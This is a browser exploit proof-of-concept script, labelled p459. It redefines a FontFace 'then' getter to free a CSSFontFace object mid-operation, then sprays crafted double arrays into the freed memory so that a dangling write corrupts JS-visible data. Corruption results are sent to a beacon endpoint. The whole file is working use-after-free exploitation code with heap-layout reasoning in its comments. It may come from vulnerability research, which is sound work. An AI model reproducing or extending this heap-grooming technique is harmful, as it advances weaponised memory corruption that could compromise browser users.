// p459-butterfly — aim the single-frame dangling-this write at JS data
// Beacon prefix: V459-
//
// Derivation (docs/engineering/uaf-frame-analysis.md): after the getter
// frees the CSSFontFace T mid-setStatus, the frame continues:
//   (B) m_status = Success (=3, 4 bytes, fixed offset)
//   (C) reads of T's sources Vector, client WeakHashSet, Timer, enums
// With raw markers in the block, (C) dispatches through garbage (p446
// deaths). With a double-array butterfly in the block, (C)'s reads land
// on elements we chose: 0.0 elements are eight zero bytes — an empty
// Vector / empty WeakHashSet / idle Timer — safe to walk. Markers near
// the m_status offset catch the (B) write as a corrupted double.
//
// Layout bet (capacity 26 -> 224-byte butterfly, class matching a
// ~0x90-0xC0 CSSFontFace):
//   elements  0-3   markers   (header/early fields)
//   elements  4-13  ZEROS     (m_sources Vector, m_clients WeakHashSet,
//                              m_wrapper WeakPtr — must read empty)
//   elements 14-25  markers   (m_status ~0x78-0x90, timer region tail)
// Detection scans EVERY element against expectation, so a write landing
// anywhere in the butterfly — including the zero band — is caught.
//
// Round loop is single-document (no reloads — reloads are what leak the
// console's browser into OOM), 8s cadence, OOM guard, full cleanup.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V459-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  var CAP = 26;
  var ZERO_LO = 4, ZERO_HI = 13;   // inclusive zero band
  var SPRAY = 200;
  var ROUND_MS = 8000;

  var hb = document.createElement('pre');
  hb.style.cssText = 'position:fixed;top:8px;left:8px;color:#0f0;background:#000;padding:6px;font:12px monospace;z-index:9';
  document.body.appendChild(hb);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  B('BOOT');

  var OK = 'local(Helvetica)';
  var arrays = [];
  var stopped = false;
  var roundNo = 0;

  function marker(i, j) {
    // distinct, exactly-representable double: i*4096 + j + 0.5
    return i * 4096 + j + 0.5;
  }

  function expected(i, j) {
    return (j >= ZERO_LO && j <= ZERO_HI) ? 0 : marker(i, j);
  }

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        arrays = [];
        try {
          for (var i = 0; i < SPRAY; i++) {
            var a = new Array(CAP);
            for (var j = 0; j < CAP; j++) a[j] = expected(i, j);
            arrays.push(a);
          }
        } catch (e) {
          B('OOMGUARD');
          stop('allocation failed — parked before any console error');
          return;
        }
      }
      return undefined;
    },
    configurable: true
  });

  function stop(msg) {
    stopped = true;
    hb.textContent = 'p459 STOPPED: ' + msg;
    hb.style.color = '#ff0';
  }

  function cleanup() {
    try {
      var st = document.querySelectorAll('style');
      for (var i = 0; i < st.length; i++) st[i].remove();
      document.fonts.forEach(function(f) { try { document.fonts.delete(f); } catch(e) {} });
    } catch(e) {}
    arrays = [];
  }

  function scan() {
    // read back every element of every array; report the FIRST deviation
    // full-detail, plus a count (a write hits one array once; anything
    // else is GC movement or a second corruption — both interesting)
    var hits = [], total = 0;
    for (var i = 0; i < arrays.length; i++) {
      var a = arrays[i];
      if (a.length !== CAP) { hits.push('LEN-a' + i + '=' + a.length); total++; continue; }
      for (var j = 0; j < CAP; j++) {
        var v = a[j];
        if (typeof v !== 'number') { hits.push('TYPE-a' + i + '-' + j); total++; continue; }
        if (v !== expected(i, j)) {
          if (hits.length < 4) hits.push('a' + i + '-e' + j + '=' + v.toPrecision(17));
          total++;
        }
      }
    }
    return { hits: hits, total: total };
  }

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round() {
    if (stopped) return;
    roundNo++;
    hb.textContent = 'p459 round ' + roundNo + ' RUNNING';
    B('R' + roundNo + '-GO');

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) {
      B('R' + roundNo + '-NOFACE');
      cleanup();
      setTimeout(round, ROUND_MS);
      return;
    }

    void face.loaded;
    face.load().then(
      function() {
        if (stopped) return;
        var r = scan();
        if (r.total > 0) {
          // THE RESULT: the dangling write landed in JS-visible data
          B('R' + roundNo + '-MARKER-' + r.hits.join('|'));
          hb.textContent = 'p459 CORRUPTION: ' + r.hits.join(' ');
          hb.style.color = '#0ff';
          B('R' + roundNo + '-TOTAL-' + r.total);
          // keep the corrupted arrays alive for inspection; no cleanup
          return;
        }
        B('R' + roundNo + '-CLEAN');
        cleanup();
        hb.textContent = 'p459 round ' + roundNo + ' clean — next in 8s';
        setTimeout(round, ROUND_MS);
      },
      function() {
        if (stopped) return;
        B('R' + roundNo + '-NO0');
        cleanup();
        setTimeout(round, ROUND_MS);
      }
    );
  }

  round();
})();
